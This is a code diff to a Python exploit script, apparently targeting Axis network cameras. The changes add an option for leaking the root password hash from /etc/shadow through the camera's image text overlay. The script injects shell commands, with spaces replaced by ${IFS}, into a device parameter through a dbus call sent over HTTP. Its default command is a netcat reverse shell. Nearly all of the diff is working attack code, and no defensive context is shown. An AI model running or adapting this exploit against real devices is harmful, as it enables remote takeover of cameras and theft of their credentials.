@@ -27,6 +27,7 @@ def logging(message: str):
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-a", "--auto", action="store_true", help="Auto mode (do not prompt for listener)")
+parser.add_argument("-e", "--exfil", action="store_true", help="Exfiltrate root password hash from shadow with image text overlay")
 parser.add_argument("-c", "--command", type=str, help="Command to run (default: 'nc [LISTEN] [LISTEN_PORT] -e /bin/sh')")
 parser.add_argument("-f", "--file", type=str, help="Target file path (default: index.shtml)")
 parser.add_argument("-i", "--overlay-only", action="store_true", help="Only modify image overlay text and exit")
@@ -152,7 +153,7 @@ def sync_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SynchParameters",
     }
     
-    logging(f"Syncing parameters...\t\t\t\t\t")
+    logging(f"Syncing parameters...\t\t\t\t\t\t")
     
     if http_check(requests.post(f"{target_url}", data=SYNC_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
@@ -162,6 +163,18 @@ def sync_req():
 # Attempts to modify image overlay
 def overlay_req():
     global stage
+
+    OVERLAY_DATA = {
+        'action': "dbus",
+        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.TextEnabled string:yes",
+    }
+
+    logging(f"Stage {stage}: Attempt to enable image overlay text...\t\t")
+
+
+    if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
+        exit(1)
+
     OVERLAY_DATA = {
         'action': "dbus",
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:{overlay_text}",
@@ -171,8 +184,45 @@ def overlay_req():
 
     if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
-        
+
+    sync_req()
+
     stage += 1
+
+
+# Leak info via text overlay
+def overlay_leak():
+    global stage
+
+    # overlay_leak_cmd = 'sed -ir \"s\|ABCD\|$(grep \'root\' /etc/shadow | cut \'-d:\' -f2)\|g\" /etc/sysconfig/image_text.conf'
+    
+    overlay_leak_cmd = 'uname'
+
+    overlay_leak_cmd_ifs = overlay_leak_cmd.replace(' ', "${IFS}")
+
+    # OVERLAY_DATA = {
+    #     'action': "dbus",
+    #     'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({overlay_leak_cmd_ifs})&",
+    # }
+
+    OVERLAY_DATA = {
+        'action': "dbus",
+        'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:Image.I0.Text.String string:{overlay_leak_cmd_ifs}",
+    }
+
+
+    logging(f"Stage {stage}: Testing image overlay exfil...\t\t")
+
+    # print(f"{overlay_leak_cmd_ifs}")
+    # exit(0)
+
+    if http_check(requests.post(f"{target_url}", data=OVERLAY_DATA, proxies=req_proxy, allow_redirects=False)):
+        exit(1)
+
+    sync_req()
+
+    stage += 1
+
 
 # Changes root.Time.DST.Enabled to 'True' for a baseline value
 def command_reset_req():
@@ -182,11 +232,12 @@ def command_reset_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:yes",
     }
     
-    logging(f"Stage {stage}: Resetting root.Time.DST.Enabled\t\t")
+    logging(f"Stage {stage}: Resetting root.Time.DST.Enabled\t\t\t")
     if http_check(requests.post(f"{target_url}", data=RESET_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
     
-    sleep(1)
+    sync_req()
+
     stage += 1   
 
 # Inject command into root.Time.DST.Enabled via dbus exploit    
@@ -198,11 +249,13 @@ def command_req():
         'args': f"--system --dest=com.axis.PolicyKitParhand --type=method_call /com/axis/PolicyKitParhand com.axis.PolicyKitParhand.SetParameter string:root.Time.DST.Enabled string:;({cmd_ifs})&",
     }
     
-    logging(f"Stage {stage}: Injecting command to root.Time.DST.Enabled...\t")
+    logging(f"Stage {stage}: Injecting command to root.Time.DST.Enabled...\t\t")
     if http_check(requests.post(f"{target_url}", data=COMMAND_DATA, proxies=req_proxy, allow_redirects=False)):
         exit(1)
-    
-    sleep(1)
+
+    logging("+ Running sync to execute command\n")
+    sync_req()
+
     stage += 1
 
 def main():
@@ -216,7 +269,11 @@ def main():
       
     if (overlay_text != ""):
         overlay_req()
-        sync_req()
+
+        if (args.exfil):
+            overlay_leak()
+
+
 
     if (args.overlay_only):
         exit(0)
@@ -226,14 +283,10 @@ def main():
             input("= Start listener and press Enter to continue...")
     
     command_reset_req()
-    sync_req()
     
     command_req()
-    logging("+ Running sync to execute command\n")
-    sync_req()
     
     command_reset_req()
-    sync_req()
     
 
 if __name__ == "__main__":
